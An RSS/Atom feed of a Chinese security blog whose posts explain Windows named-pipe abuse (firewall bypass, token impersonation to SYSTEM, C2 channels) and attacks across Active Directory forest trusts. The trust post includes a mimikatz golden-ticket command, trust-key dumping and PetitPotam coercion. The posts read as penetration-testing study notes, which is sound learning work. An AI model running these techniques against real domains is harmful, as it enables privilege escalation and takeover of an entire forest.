<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2024-06-05T12:50:03.740Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>windows安全初探之命名管道</title>
    <link href="https://ke1nys.github.io/posts/6453c557.html"/>
    <id>https://ke1nys.github.io/posts/6453c557.html</id>
    <published>2024-06-05T08:46:24.000Z</published>
    <updated>2024-06-05T12:50:03.740Z</updated>
    
    <content type="html"><![CDATA[<p>参考文章</p><p><a href="https://cloud.tencent.com/developer/article/1625924">https://cloud.tencent.com/developer/article/1625924</a></p><p><a href="https://www.freebuf.com/articles/web/283359.html">https://www.freebuf.com/articles/web/283359.html</a></p><p><a href="https://yangsirrr.github.io/2021/11/04/shi-xian-li-yong-ming-ming-guan-dao-bu-chong-ling-pai-mo-ni/#toc-heading-4">https://yangsirrr.github.io/2021/11/04/shi-xian-li-yong-ming-ming-guan-dao-bu-chong-ling-pai-mo-ni/#toc-heading-4</a></p><p>关于命名管道的概念啥的我这里就不写了  参考文章中写的挺详细的  直接去看就行了</p><p>关于<code>IPC</code>的话  这个就是进程之间通信的方法  我们在共享目录也能看到</p><p><img src="../images/image-20240605202234787.png" alt="image-20240605202234787"> </p><p><strong>远程管理</strong>：</p><ul><li>管理员通过 <code>IPC$</code> 共享来执行远程管理任务，比如远程执行命令、查看和修改系统配置等。</li></ul><p><strong>网络登录和身份验证</strong>：</p><ul><li>在用户通过网络尝试访问共享资源时，系统会使用 <code>IPC$</code> 共享来进行身份验证。</li></ul><p><strong>远程服务和进程间通信</strong>：</p><ul><li>某些服务和应用程序使用 <code>IPC$</code> 共享来进行远程通信和数据交换。</li></ul><h1 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h1><h2 id="绕过防火墙"><a href="#绕过防火墙" class="headerlink" title="绕过防火墙"></a>绕过防火墙</h2><p>这里说的防火墙，是指 windows 系统自带的防火墙，类似于 UAC，需要用户点击允许访问才可放行。</p><p><img src="../images/0th4i163q8.png" alt="img"></p><p>当尝试使用 <code>Bind()</code> 绑定一个 TCP Socket 时，Defender 就会自动弹窗提示是否允许此程序进行网络连接，在高权限下，通过修改防火墙规则，可以轻松的绕过这一限制，但是，当权限不足时，就需要另外想办法了。</p><p>这个时候我们还有另外的办法就是利用命名管道，命名管道网络通信使用了未加密的 <strong>SMB 协议（端口 445）或 DCE\RPC（端口 135）</strong>。在 Windows 中，通常默认允许 SMB 协议出入站（如果当年没有因为 WannaCry 主动做策略限制的情况下），因此，如果有什么功能或机制可以用于与外部机器进行通信的，SMB 协议无疑是一种很好的选择。所以我们可以基于命名管道与外部机器进行通信，从而建立控制通道。</p><p><strong>(本地进行通信的话是不需要进行身份认证  访问远程的命名管道的话 是需要进行身份认证的)</strong></p><h2 id="模拟令牌-token"><a href="#模拟令牌-token" class="headerlink" title="模拟令牌(token)"></a>模拟令牌(token)</h2><p>这也是命名管道中常见的一种方法，一般可以用来提权操作，c2和msf等等工具的getsystem都是用这个方法(<strong>进程注入也是用的该原理</strong>)</p><p><code>Administrator</code>———&gt;<code>system</code>   就是来实现这个权限提升</p><ul><li><p>本地创建一个管道(里面加上复制token的函数) 然后开启监听</p></li><li><p>本地创建一个服务 内容是 <code>cmd.exe /c echo “some data” &gt;\.\pipe[random pipe here]</code></p></li><li>然后运行该服务就行了</li></ul><p>这里用到的其实是<code>SeImpersonatePrivilege</code>这个特权  运行该服务的账户必须有这个特权</p><p><img src="../images/image-20240605203901323.png" alt="image-20240605203901323"></p><p>impersonateNamedPipeClient命名管道允许服务端进程模拟已连接的客户端进程，调用此函数，命名管道文件系统会更改调用进程的线程，开始模拟从管道读取的最后一条消息的安全内容 如当目标用户的进程连接并写入输入攻击者的命名管道，则攻击者能够调用ImpersonateNamedPipeClient模拟目标的令牌，从而模拟用户，进程必须拥有SeImpersonatePrivilege权限（身份证验证后模拟客户端，否则可能无法提权成功），常规情况下该权限一般是系统使用在本地服务账号或者网络账号的，所以当通过服务账户启动的服务漏洞后就可获取相关权限，如-local service或network service，权限可能较低，但可以用他来进行权限提升至system</p><p><img src="../images/image-20240605204146447.png" alt="image-20240605204146447"></p><p><img src="../images/image-20240605204301869.png" alt="image-20240605204301869"></p><p>查看该新建的服务运行权限确实是system</p><h2 id="c2通信"><a href="#c2通信" class="headerlink" title="c2通信"></a>c2通信</h2><p><img src="../images/pkjtg2cwpx.png" alt="img"></p><p>如图所示，每个终端将为每个直接连接的子终端提供一个命名管道服务器和一个命名管道客户端。服务器监听管道名称，并等待客户端的连接。客户端连接到特定主机名和管道名称的服务器，从而创建命名管道。管道的每一个终端都有从另一个终端读取和写入的能力，即，将 <code>Payload</code> 运行（注入）后，创建了自定义命名管道（作服务端），等待连接即可，这一过程被称为 “ 绑定 “（Bind）连接。</p><p>这种连接方式很常见，如 Metasploit 和 Cobalt Strike 都有类似功能。 </p><p><strong>可以进行读写和执行命令的操作</strong>  </p><ul><li>靶机作为服务端  </li><li>c2作为客户端</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考文章&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://cloud.tencent.com/developer/article/1625924&quot;&gt;https://cloud.tencent.com/developer/article/1625924&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>基于域信任关系的域攻击</title>
    <link href="https://ke1nys.github.io/posts/39e9c7a4.html"/>
    <id>https://ke1nys.github.io/posts/39e9c7a4.html</id>
    <published>2024-05-28T12:36:37.000Z</published>
    <updated>2024-06-05T07:35:10.106Z</updated>
    
    <content type="html"><![CDATA[<p>在梳理完单域的攻击手法后 于是就打算重新开这一篇文章来写这个关于域森林的文章</p><p>参考文章</p><p><a href="https://www.geekby.site/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/#%E5%9F%9F%E4%BF%A1%E4%BB%BB">https://www.geekby.site/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/#%E5%9F%9F%E4%BF%A1%E4%BB%BB</a></p><p><a href="https://www.boundaryx.com/info/2145.html">https://www.boundaryx.com/info/2145.html</a></p><p><a href="https://www.t00ls.com/articles-69791.html">https://www.t00ls.com/articles-69791.html</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在实战中单域出现的概率远大于域森林出现的概率，但在一些大型公司或企业可能会见到。本篇主要是针对域控的在复杂内网环境中的攻击方式来进行梳理并且介绍了域信任、利用域信任进行横向移动以及一些在信任利用中涉及到的知识和概念。</p><p><strong>(环境就不自己搭建了  图片就照搬上面参考文章的了)</strong></p><h1 id="域信任"><a href="#域信任" class="headerlink" title="域信任"></a>域信任</h1><p><strong>域环境分单域、父子域、域树和域森林</strong>，在实战中<strong>单域</strong>是最常见的，也是相对最简单的，但是想要在域森林中进行横向移动就必须要了解单域中的利用方式和相关原理。接下来说父子域，父子域就是一个域(父域)下分出了很多个子域，可能子域下还有子域，当这种关系复杂化之后就形成了域树，当域树多了之后就形成了域森林。</p><p>域信任关系可以是<strong>单向\双向信任</strong>、<strong>可传递\不可传递信任</strong>、<strong>内部\外部信任</strong>、<strong>跨域链接信任(cross link trust)</strong>等类型。例如，2 个域之间有单向可传递的外部信任关系。同一个森林(Forest)内部的域信任关系，一般隐含为<strong>双向可传递的内部信任关系</strong>。</p><p><img src="../images/image-20240528205053959.png" alt="image-20240528205053959"></p><p><code>跨域链接信任</code>(cross link)，指的是在同一个森林的两个子域间建立直接的信任关系。因为在同一个森林中，域的组织关系是树状结构，从一个子域到另外一个域，需要从树枝的子域顺寻到根域(Forest Root)，然后从根域继续顺寻到另外一个子域，而跨域链接相当于 在 2 个子域之间之间建立了一个快捷方式的信任关系，以减少认证和授权的时间和步骤。</p><p><code>内部信任</code>指的是森林内部域之间的信任关系。相应地，<code>外部信任</code>(External Domain Trust)指的是域和所在森林之外的域之间的信任关系。 </p><p>父子信任关系是最常见的域信任关系，在同一个森林内部，加入一个新域时，最常见的是子域模式(Parent- Child)，或者是树根模式(Tree-Root)，这两种模式分别会建立父子信任\树根信任关系，都是<strong>双向可传递的内部信任关系。</strong></p><p><img src="../images/image-20240528205359797.png" alt="image-20240528205359797"></p><p>根据这个图来看  </p><ul><li><code>adsec.com</code>和<code>lab.adsec.com</code>是父子域的关系</li><li><code>adsec.com</code>和<code>res.com</code>是树根域的关系</li><li><code>adsec.com</code>和<code>testlab.com</code>是林域的关系  (<strong>这两者就是森林外部的相互信任了 </strong>)</li></ul><h1 id="跨域认证和资源访问授权"><a href="#跨域认证和资源访问授权" class="headerlink" title="跨域认证和资源访问授权"></a>跨域认证和资源访问授权</h1><p>当 2 个域之间建立域信任关系时，会建立共享的<code>域间密钥</code>(Inter-Realm Key，简写为<code>IRKey</code>)，其作用相当于 <code>Krbtgt</code>，只不过 <code>IRKey</code> 用于相互信任的 2 个域之间的认 证，而 Krbtgt 用于同一个域服务器的 AC 和 KDC 之间的认证。<strong>这个<code>IRKey</code>其实就是信任用户的ntlm值，而且在双向信任的情况下，ntlm的值也是不同的(这也说明了双向信任其实就是两个单向信任的叠加)</strong></p><ul><li>当设置域B 到域A 的单向信任时（B信任A），将在域A中创建一个名为B$ 的信任帐户。当域 A 中的用户请求域 B 中的服务票证时，此信任帐户的Hash 用于加密域间 TGT。</li></ul><p>信任域之间的认证授权过程，与同一个域中的认证授权大抵相似，但仍然有不少区别。</p><p><img src="../images/image-20240528211221175.png" alt="image-20240528211221175"></p><ol><li>Jack 向 DC1 发起认证请求，数据由 Jack 的口令 NTLM 值加密;</li><li>DC1 使用 Jack 的口令 NTLM 值验证收到的认证请求，返回一个通过认证的 TGT 票据给 Jack;</li><li>Jack 使用 TGT 票据，向 DC1 发起授权请求，发起 请求访问 DC2 中文件服务的 TGS_REQ;</li><li>DC1 检查到文件服务在 DC2 中，返回一个可转投的 TGT(Referral TGT)，指明需转投到 DC2，使用 IRKey 加密可转投 TGT 中的认证信息;</li><li>Jack 收到可转投的 TGT 后，根据提示信息，使用转投 TGT，发起访问 DC2 中文件服务的请求 TGS_REQ;</li><li>DC2 收到请求后，使用 IRKey 验证可转投 TGT 中的认证信息，返回一个允许访问文件服务的 TGS 票据，票据中部分信息使用运行文件服务的服务账号的口令 NTLM 值加密;</li><li>Jack 使用收到的 TGS 票据访问 DC2 中的文件服务;</li><li>文件服务的服务账号使用口令 NTLM 值校验 TGS</li></ol><p><strong>(这里所说的IRKey其实就是信任用户的ntlm值 这个东西很重要)</strong></p><p>当 2 个域之间建立信任关系时，会在全局域数据库中存档对方的 SPN、DNS 等信息，方便访问时进行查询。例如，上图中，DC1 会存档 DC2 中所有的服务 SPN、DNS 等信息。</p><p>如果 Jack 请求访问的服务在 DC1 的全局数据库中，则会返回转投 TGT，如果不在，如果 DC1 有父域，则 DC1 会向父域请求直至森林的根域服务器，如果 DC1 本身是根服务器(本例中 DC1 是根域服务器)，则直接告诉 Jack，请求访问的服务不存在。</p><p>一个森林只有一个全局数据库。</p><h1 id="SIDHistory-版跨域黄金票据"><a href="#SIDHistory-版跨域黄金票据" class="headerlink" title="SIDHistory 版跨域黄金票据"></a>SIDHistory 版跨域黄金票据</h1><h2 id="SIDHistory"><a href="#SIDHistory" class="headerlink" title="SIDHistory"></a>SIDHistory</h2><p>每个用户帐号都有一个对应的安全标识符（Security Identifiers，SID），SID用于跟踪主体在访问资源时的权限。如果存在两个同样SID的用户，这两个帐户将被鉴别为同一个帐户，原理上如果帐户无限制增加的时候，会产生同样的SID，在通常的情况下SID是唯一的，他由计算机名、当前时间、当前用户态线程的CPU耗费时间的总和三个参数决定以保证它的唯一性。<br>为了支持AD牵移，微软设计了SID History属性，SID History允许另一个帐户的访问被有效的克隆到另一个帐户。</p><p>一个完整的SID包括：</p><ul><li>用户和组的安全描述</li><li>48-bit的ID authority</li><li>修订版本</li><li>可变的验证值Variable sub-authority values</li></ul><p>例：S-1-5-21-310440588-250036847-580389505-500<br>第一项S表示该字符串是SID；第二项是SID的版本号，对于2000来说，这个就是1；然后是标志符的颁发机构（identifier authority），对于2000内的帐户，颁发机构就是NT，值是5。然后表示一系列的子颁发机构，前面几项是标志域的，最后一个标志着域内的帐户和组。<br>可以注意到最后一个标志位为500，这个500是相对标识符（Relative Identifer, RID），账户的RID值是固定的。一般克隆用户原理就是篡改其他用户的RID值使系统认为对应用户是管理员。<br>常见的RID：<strong>500-管理员 519-EA 501-Guest</strong></p><p><code>SIDHistory</code>(在 PAC 结构中为 <code>ExtraSids</code> 字段)是为了方便用户在域之间的迁移。当一个用户迁移到新的域后，原来的 <code>SID</code> 以及所在组的一些 <code>SID</code>，都可被加入到新域中新用户的 <code>SIDHistory</code> 属性。当这个新的用户访问某个资源时，根据 <code>SID</code> 或者 <code>SIDHistory</code> 在资源 <code>ACL</code> 中的匹配性来判断是拒绝或者允许访问。因此 <code>SIDHistory</code> 相当于多了一个或者多个组属性，权限得到了扩张</p><h2 id="制作跨域黄金票据SIDHistory"><a href="#制作跨域黄金票据SIDHistory" class="headerlink" title="制作跨域黄金票据SIDHistory"></a>制作跨域黄金票据SIDHistory</h2><p>在一个域中，一旦我们获取 Krbtgt 的 NTLM 值，则可以构造黄金票据，伪造成域内任意用户，包括管理员，获取对域的完全访问控制权限。但是在同一个森林的不同域中，黄金票据不再有效<strong>(是因为每个域的Krbtgt的ntlm值不同)。</strong></p><p>回顾一下黄金票据的几大要素，即域名、域的SID(Security Identifier)、本域 Krbtgt 用户口令 NTLM 值、想伪造票据的用户 RID(Relative Identifier，在无特别指明情况下，Mimikatz 工具会设置 RID 为域管理员的 RID)。不同的域有不同的 Krbtgt，导致黄金票据在不同的域之间失效。</p><p>如果一个用户的 <code>SIDHistory</code> 属性被设置为高权限组或者用户的 <code>ID</code>，则该用户也具备等同于高权限组或者用户的权限。如果我们伪造的黄金票据中加入目标域的域管理员组的 <code>SID</code>，则可以获取目标域的域管理员权限，<code>黄金票据</code>和 <code>SIDHistory</code> 的结合，可实现跨域黄金票据。</p><p>由于每个域的 <code>SID</code> 都不同，叠加 <code>SIDHistory</code> 的黄金票据不具备通用性。根据微软的描述，在同一个域森林内部，企业管理组 <code>EA(Enterprise Administrators)</code> 会自动被森林内部所有域加入到本域的域管理员组，且 <code>EA</code> 只存在于根域中，所以企业管理组 <code>EA</code> 的 <code>SID</code> 固定为根域的 <code>SID</code> 加上固定的 <code>RID</code> 即 <code>519</code>。</p><p>因此，如果将使用企业管理组 <code>EA</code> 的 <code>SID</code> 设置 <code>SIDHistory</code> 属性，和黄金票据结合，则在只获取任意一个域 <code>krbtgt</code> 账号 <code>NTLM</code> 值的前提下，可实现森林内部所有域的跨域黄金票据，这种票据可简称为 <code>SIDHistory</code> 版黄金票据。</p><p>当然也可以添加森林内某个指定域的管理员组 <code>SID</code> 为 <code>SIDHistory</code>，但是这样的黄金票据只对该指定域有效，对其他域无效。不如使用企业管理员 <code>SID</code> 的票据那样有通用性。</p><p><strong>(简单点说就是伪造当前域管  然后将域管的<code>sidhistory</code>给改了)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden /user:anyusername sids:[EA组的sid] /sid:[lab.adsec.com域的sid] /domain:lab.adsec.com /krbtgt:16ed27ee7848756cfa96b33c25e3ad3d /ptt&quot; exit</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240529001535543.png" alt="image-20240529001535543"></p><p>仍然在 <code>lab.adsec.com</code> 域中构造黄金票据，但添加了 <code>SIDS</code> 参数，使用根域的企业管理员 SID 作为参数值，即 <code>SIDHistory</code> 版黄金票据，对 <code>lab.adsec.com</code> 和 <code>adsec.com</code> 域均有效。</p><p>这里需要注意的是，实现 <code>SIDHistory</code> 版黄金票据的基础是森林内信任关系，因为如果不是森林内信任关系，则 <code>SIDHistory</code> 会被微软的 <code>SID Filter</code> 规则过滤掉，从而失效，但森林内部不会有 <code>SID Filter</code> 规则。这也是为什么说是森林而非域才是安全边界。</p><p><strong>(这里所说的<code>SID Filter</code>过滤规则其实是在林信任的时候才会生效  在森林内的话是不会生效的)</strong>  </p><h1 id="IRKey-版跨域黄金票据"><a href="#IRKey-版跨域黄金票据" class="headerlink" title="IRKey 版跨域黄金票据"></a>IRKey 版跨域黄金票据</h1><p>当 2 个域之间建立域信任关系时，需要建立共享的域间密钥(<code>Inter-Realm Key</code>，简写为 IRKey)，其作用相当于 Krbtgt，只不过是用于相互信任的 2 个域之间，而 Krbtgt 用于同一个域服务器的 AC 和 KDC 之间。</p><p>只要获取森林内部任意域的 krbtgt 账号的 NTLM 值，则通过 <code>SIDHistory</code> 版黄金票据，即可获取全森林所有域的控制权。因此为了防御，必须 2 次修改森林内部所有域的 <code>krbtgt</code> 账号的 <code>NTLM</code> 值。</p><p>在多域环境中，<code>IRKey</code> 和主机账号类似，系统默认每 <code>30</code> 天自动修改一次 <code>NTLM</code>。所以即使 2 次修改森林内所有域的 <code>krbtgt</code> 账号的 <code>NTLM</code>，<code>IRKey</code> 的 <code>NTLM</code> 大概率仍然没有发生改变(小概率是 <code>krbtgt</code> 的 <code>NTLM</code> 修改正好碰上了 <code>IRKey</code> 的修改周期)。</p><p>类似白银票据，可以使用 <code>IRKey</code> 伪造域间可转投票据(<code>Inter-Realm Referral TGT</code>)，获取目标域的域管理员权限，再结合上一节的 <code>SIDHistory</code> 版黄金票据，再次获取整个森林的控制权。这里需要注意的是 <code>SID</code> 为目标域的 <code>SID</code>。</p><p>在域中，大部分带 <code>‘$’</code> 符号的账号为 <code>Computer</code> 账号，但是 <code>User</code> 组带 <code>‘$’</code> 符号的账号为信任账号，可以通过域服务器自带的 <code>Powershell</code> 命令 <code>Get-ADUser</code> 获取所有 带 <code>‘$’</code> 符号的 <code>User</code> 账号，下图中 <code>ADSEC$</code> 账号为信任账号，隶属于 <code>Users</code> 组。<strong>(当设置域B 到域A 的单向信任时（B信任A），将在域A中创建一个名为B$ 的信任帐户。当域 A 中的用户请求域 B 中的服务票证时，此信任帐户的Hash 用于加密域间 TGT。)</strong></p><p><img src="../images/20200504112640.png-water_print" alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200504112640.png-water_print"></p><p>有 2 种方式可以获取信任账号的 <code>NTLM</code> 值。</p><h2 id="Dcsync-获取信任账号的-NTLM-值"><a href="#Dcsync-获取信任账号的-NTLM-值" class="headerlink" title="Dcsync 获取信任账号的 NTLM 值"></a>Dcsync 获取信任账号的 NTLM 值</h2><p>下图采用 <code>Dcsync</code> 方式，获取 <code>lab.adsec.com</code> 域中信任账号 <code>adsec$</code> 的 <code>NTLM</code> 值，结果表明该账号的类型为 <code>TRUST_ACCOUNT</code></p><p><img src="../images/20200504112712.png-water_print" alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200504112712.png-water_print"></p><h2 id="lsadum-获取信任账号的-NTLM-值"><a href="#lsadum-获取信任账号的-NTLM-值" class="headerlink" title="lsadum 获取信任账号的 NTLM 值"></a>lsadum 获取信任账号的 NTLM 值</h2><p>采用 <code>lsadump::trust /patch</code>方式。从下图中可看到有 <code>[IN] LAB.ADSEC.COM -&gt; ADSEC.COM</code> 和 <code>[OUT] ADSEC.COM -&gt; LAB.ADSEC.COM</code> 两种不同的 <code>NTLM</code> 值，分别是往外到其他域和往内到本域访问时用到的值。因为双向信任关系其实是 2 个单向信任关系的叠加，所以会有 2 个密钥。这里我们要从本域构造 <code>IRKey</code> 版黄金票据访问森林内部其他域，所以使用 <code>IN</code> 这个 <code>NTLM</code> 值。</p><p><img src="../images/20200504113851.png-water_print" alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200504113851.png-water_print"></p><p>由于 <code>IRKey</code> 存在于森林内部的信任域之间，也存在于森林外部的森林之间，均可用于转投认证。在 <code>SIDHistory</code> 版黄金票据中，由于 <code>SID Filter</code> 规则，在森林之间不能使用，<strong>但是 <code>IRKey</code> 版不涉及这个安全过滤规则，仍然有效</strong>。<strong><code>IRKey</code> 版黄金票据可以分作森林内部的、森林外部的 2 种，操作方法类似，这里我们着重介绍森林内部的 <code>IRKey</code> 版黄金票据。</strong></p><p><img src="../images/20200504114210.png-water_print" alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200504114210.png-water_print"></p><p><strong>(这里面的krbtgt是信任用户的ntlm值  这里指定的service和信任域的原因是为了伪造tgt)</strong></p><p><strong>/service</strong></p><ul><li>指定服务为krbtgt，这意味着生成的票据将由信任域的krbtgt服务签名，用于请求信任域的TGT（Ticket Granting Ticket）。</li></ul><p><strong>/target</strong>:</p><ul><li>指定目标信任域，表示生成的票据将用于这个信任域，使攻击者能够在该域中操作。</li></ul><p>域间转投票据的认证，依靠 <code>IRKey</code> 加密。在我们已知 <code>IRKey</code> 的前提下，可以伪造持有该 <code>IRKey</code> 的信任域的任意用户。测试中，我们构造一个票据，告诉 <code>adsec.com</code> 域，转投认证的用户为 <code>administrator</code>，而且 <code>SIDHistory</code> 为根域的企业管理员。</p><p>构造成功后，具备 <code>adsec.com</code> 的管理员权限，但是不能高权限访问 <code>lab.adsec.com</code>，因为构造的票据是到 <code>adsec.com</code> 域的管理员票据。在获取 <code>adsec.com</code> 域的高权限后，可以获取该域的 <code>krbtgt</code> 账号的 <code>NTLM</code> 值，在此基础上，继续构造 <code>SIDHistory</code> 版黄金票据，从而可以获取整个森林的控制权。</p><h1 id="绕过SID过滤"><a href="#绕过SID过滤" class="headerlink" title="绕过SID过滤"></a>绕过SID过滤</h1><p><strong>外部信任就是指的是两个域林之间的域的信任</strong></p><p><strong>林信任就是指的是两个域林之间根域的信任</strong></p><p><strong>(两者相较而言  外部信任的限制更少)</strong></p><p>外部信任和林信任中存在SID过滤机制，所以无法利用SID History获取权限，SID过滤机制在林内部默认被禁用。但是可以通过netdom命令手动开启即允许跨域林信任的SID-history<br>SID过滤机制是如何工作的，以及SID过滤机制过滤了哪些SID<br>在域林A和外部域林B中，存在SID过滤，比如域林A中的用户请求林B中的资源，会过滤SID-history属性值（过滤不属于林A中的用户SID，因为在跨域的金票制作中，我们会将根域的企业管理员用户的SID放进ExtraSids中，但是在这种过滤下，这种方法不在有效），但是试想一下，如果林A中的用户在林B中被赋予了特殊权限，我们还是可以通过这种方法进行利用的，或者通过netdom（偷图）</p><p><img src="../images/image-20240530154700034.png" alt="image-20240530154700034"></p><p><img src="../images/244e3783-73e1-4d9a-9da9-ddf7464ac22f.png" alt="img"></p><p>ldap导出 TrustAttributes结构，可以看到TREAT_AS_EXTERNAL标志<br><img src="../images/de61a4c8-47ae-4dc3-8d8f-29cf53097821.png" alt="img"><br>微软关于这个标志位的说明如下</p><p><img src="../images/c28b99c4-1a94-4c97-ac97-cd614afef4db.png" alt="img"></p><p>如果设置了此位，则出于 SID 过滤的目的，对域的跨林信任将被视为外部信任。跨林信任比外部信任过滤得更严格。此属性将那些跨林信任放宽为等同于外部信任。有关如何过滤每种信任类型的更多信息，请参阅 [MS-PAC] 第 4.1.2.2 节。<br>在林A和林B中SID过滤机制会过滤林A中的SID，我们分析TREAT_AS_EXTERNAL这个标志了解到如果设置了此位（netdom命令），则出于 SID 过滤的目的，对域的跨林信任将被视为外部信任~，也就是说减小了我们的限制，此时我们依然可以将林B中的用户SID放进ExtraSids中，但是仍然会过滤一些用户的sid如DA/EA/Account Operators组的用户，总结的来说就是虽然减小了限制，但是只能通过SID-history攻击sid为1000以上的用户(如果高权限组自定义为1000以上了也是可以利用的，比如exchange相关的一些组)。<br><img src="../images/67eb2dfb-79a3-4ab3-868c-76190ef353f4.png" alt="img"></p><h2 id="利用SQLServer链接"><a href="#利用SQLServer链接" class="headerlink" title="利用SQLServer链接"></a>利用SQLServer链接</h2><p>这种利用方式的原理和SID没有任何关系，只不过前面几种方式都限制在了SID过滤。SQLServer的信任连接(Linked Servers）是跨林的所以我们也可以利用这点来进横向。下面是微软关于(Linked Servers）的解释，我们只需要大致了解它的使用场景并且知道Linked Servers是可以跨域的就可以了。使用SQL Server时，可能会这种情况，需要从一个SQL Server服务器A中，查询另一个SQL Server服务器B中的表，然后将SQL Server服务器A中的表和SQL Server服务器B中的表进行JOIN，像类似这种跨SQL Server服务器的SQL语句操作，我们就可以通过在SQL Server中建立Linked Servers来实现。利用过程就是在林A的SQL上发现了林B的信任链接，那就代表可以使用这个链接，此后就可以在林B的SQL上执行SQL语句(MSSQL的利用方式了，到了这里还可以通过烂番茄实现本地提权)<br><img src="../images/cef51a5b-7bfc-4730-9842-87e5141aebea.png" alt="img"><br>创建漏洞环境<br><img src="../images/a34b6083-fa81-4124-bcde-a336d3acdc4d.png" alt="img"></p><p><img src="../images/5.png" alt="img"></p><p><img src="../images/a5ef49d2-e9d4-46f6-8f91-136553cda697.png" alt="img"><br>结果类似下面这样<br><img src="../images/c7c35757-6bd9-42e9-8ba0-a8ff7cfeed75.png" alt="img"></p><h2 id="利用GPO"><a href="#利用GPO" class="headerlink" title="利用GPO"></a>利用GPO</h2><p>GPO是Group Policy Object的缩写，译为组策略对象，作用在于控制用户可以干什么不可以干什么，比如密码必须要符合要求，特定文件夹访问权，安装附加功能或者以管理身份运行某些软件等等，这一套策略就叫组策略对象。GPO支持任务计划是从windows2008开始。如批量下发GPO中利用的就是通过GPO下发任务计划，但域内组策略更新的时间为90分钟，需要通过命令(gpupdate)来强制进行触发，因为GPO可以实现跨域同步，所以可以用来进行跨域攻击。</p><p><img src="../images/8caa4b83-b655-4428-9774-4855c50d82f1.png" alt="img"></p><p>在子域域控上以system(否则会报错)可以链接GPO到AD 复制站点，包括父域DC所在的站点</p><p><img src="../images/image-20240530161315733.png" alt="image-20240530161315733"></p><p><img src="../images/c6c67388-1620-424b-a70b-38e766eab4ae.png" alt="img"><br><img src="../images/30ffbf33-4941-4825-98b0-d33b4391c077.png" alt="img"><br>将fire.goal.lab的名为pentest的GPO链接到父域goal.lab</p><p><img src="../images/6-1.png" alt="img"></p><p>链接到父域的时候  就可以看到这个组策略了   然后我们添加定时任务</p><p><img src="../images/image-20240530161431138.png" alt="image-20240530161431138"></p><p>这个是时候在父域是看不到这个组策略的  因为组策略的更新时间为90分钟  我们得在子域上执行<code>gpupdate</code>  强制更新</p><p><img src="../images/image-20240530161621140.png" alt="image-20240530161621140"></p><p>强制更新之后 组策略就会触发</p><h2 id="利用委派"><a href="#利用委派" class="headerlink" title="利用委派"></a>利用委派</h2><p>可以看到m03配置了非约束委派，其实域控默认都是配置了非约束委派的，也就是说如果父域访问m03就会留下父域的TGT，假设我们已经拿下了子域fire.goal.lab的域控m03<br><img src="../images/a1adb43d-383e-4595-97f8-5bbdab4fd52d.png" alt="img"><br>在子域的域控上进行监听<br><img src="../images/30f664f4-0937-4f3d-9850-743fdf59a4fe.png" alt="img"><br>接下来开始强制认证<br>开启了webclient(不开也可以触发成功)，可以用PetitPotam强制进行认证，我尝试了以下几个trigger，但只有PetitPotam成功进行了强制触发，并且在低版本系统中PetitPotam是可以进行性匿名强制触发的。<br><img src="../images/8a0c660f-d5f8-4f52-b53a-d288eda0416f.png" alt="img"><br>使用不同的trigger强制触发认证<br><img src="../images/1882798b-8be7-47fc-ac61-701a44e5024f.png" alt="img"><br><img src="../images/4505ca79-1338-48de-aeec-b9bf6360dd23.png" alt="img"><br><img src="../images/ad310d6d-7d63-42c8-8ae2-0468bb21722e.png" alt="img"><br>收到凭据<br><img src="../images/fc526e7d-c096-4b3f-a47e-d90f513b5bee.png" alt="img"><br>处理后dcsync拿到企业管理员hash<br><img src="../images/252add90-9beb-451e-b4e2-7ed0a9d61373.png" alt="img"></p><p><img src="../images/7b28121c-77d2-4b65-af33-97abfb01a841.png" alt="img"><br>同样可以登录子域域控<br><img src="../images/cdc7cad8-06fd-4342-a366-28532b5cfc1d.png" alt="img"></p><p>这个强制认证的打ntlm中继的攻击可以看<a href="https://forum.butian.net/share/1944">https://forum.butian.net/share/1944</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里只是记录了一部分的攻击方法  并且这个攻击也适用于林域内  因为为了安全  可能林内也会开启这个<code>sid filter</code>预防<code>sidhistory</code>攻击</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在梳理完单域的攻击手法后 于是就打算重新开这一篇文章来写这个关于域森林的文章&lt;/p&gt;
&lt;p&gt;参考文章&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.geekby.site/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E</summary>
      
    
    
    
    
    <category term="ad域" scheme="https://ke1nys.github.io/tags/ad%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>Windows内网渗透-详细</title>
    <link href="https://ke1nys.github.io/posts/eca6cb79.html"/>
    <id>https://ke1nys.github.io/posts/eca6cb79.html</id>
    <published>2024-05-17T07:46:22.000Z</published>
    <updated>2024-06-05T07:35:10.106Z</updated>
    
